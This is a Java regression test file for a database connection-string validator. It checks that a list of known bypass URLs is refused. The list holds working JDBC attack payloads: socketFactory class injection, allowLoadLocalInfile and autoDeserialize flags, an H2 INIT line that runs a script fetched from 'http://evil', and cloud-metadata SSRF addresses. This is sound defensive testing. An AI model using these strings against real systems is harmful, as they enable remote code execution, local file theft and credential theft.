package com.example.dynamicmeta.connection;

import org.junit.jupiter.api.Test;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.catchThrowable;

/**
 * Connection strings that once slipped past the parser or the policy. Each must be
 * refused before any connection is attempted, with no host allowlist configured
 * (the default). Add new cases here whenever a bypass is found.
 */
class ConnectionBypassRegressionTests {

    private static final List<String> MUST_BE_REFUSED = List.of(
            // Parameters hidden in the authority or path, so the allowlist never saw them.
            "jdbc:postgresql://db.example.com:5432?socketFactory=evil.Factory",
            "jdbc:postgresql:app?socketFactory=evil.Factory",
            "jdbc:postgresql://db.example.com/app;socketFactory=evil",
            "jdbc:mysql://address=(host=db.example.com)(port=3306)(allowLoadLocalInfile=true)/app",
            "jdbc:mysql://(host=db.example.com,autoDeserialize=true)/app",
            "jdbc:mysql:loadbalance://db.example.com/app",
            "jdbc:mysql://db.example.com/app;allowLoadLocalInfile=true",
            "jdbc:mysql://db.example.com/app%3FallowLoadLocalInfile=true",
            "jdbc:mariadb://db.example.com/app;allowLocalInfile=true",
            "postgres://u:p@db.example.com/app%3FsocketFactory%3Dx",
            "sqlserver://u:p@db.example.com/app;socketFactoryClass=x",
            "jdbc:sqlserver://db.example.com;databaseName={x;socketFactoryClass=evil}",
            "jdbc:sqlserver://;serverName=169.254.169.254",
            // Oracle forms the parser cannot check.
            "jdbc:oracle:thin:@(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=169.254.169.254)(PORT=1521))"
                    + "(CONNECT_DATA=(SERVICE_NAME=x)))",
            "jdbc:oracle:thin:@//db.example.com:1521/svc?oracle.net.wallet_location=/etc",
            "jdbc:oracle:thin:@myalias",
            // Embedded databases, including H2 over TCP with INIT.
            "jdbc:h2:tcp://db.example.com/~/x;INIT=RUNSCRIPT FROM 'http://evil/x.sql'",
            "jdbc:h2:mem:x",
            // Dangerous or timeout-disabling parameters in plain sight.
            "jdbc:postgresql://db.example.com/app?socketFactory=evil.Factory",
            "jdbc:postgresql://db.example.com/app?SOCKETFACTORY=x",
            "jdbc:postgresql://db.example.com/app?socketTimeout=0",
            "jdbc:mysql://db.example.com/app?useSSL=true&allowLoadLocalInfile=true",
            "jdbc:sqlserver://db.example.com;databaseName=x;socketFactoryClass=evil",
            "jdbc:sqlserver://host:1433;loginTimeout=0",
            // Cloud metadata and link-local addresses.
            "jdbc:postgresql://169.254.169.254/app",
            "postgres://u:p@169.254.169.254/app",
            "jdbc:postgresql://[fe80::1]/app",
            "jdbc:postgresql://[::ffff:169.254.169.254]/app");

    private final ConnectionStringParser parser = new ConnectionStringParser();
    private final ConnectionPolicy openPolicy = new ConnectionPolicy(List.of(), false);

    @Test
    void knownBypassesAreRefusedBeforeConnecting() {
        for (String url : MUST_BE_REFUSED) {
            Throwable thrown = catchThrowable(() -> openPolicy.validate(parser.parse(url)));
            assertThat(thrown)
                    .as("should be refused: %s", url)
                    .isInstanceOfAny(IllegalArgumentException.class, ConnectionRejectedException.class);
        }
    }

    @Test
    void refusalsNeverEchoCredentials() {
        Throwable thrown = catchThrowable(() ->
                openPolicy.validate(parser.parse("postgres://u:s3cret@169.254.169.254/app")));
        assertThat(thrown).isNotNull();
        assertThat(thrown.getMessage()).doesNotContain("s3cret");
    }
}
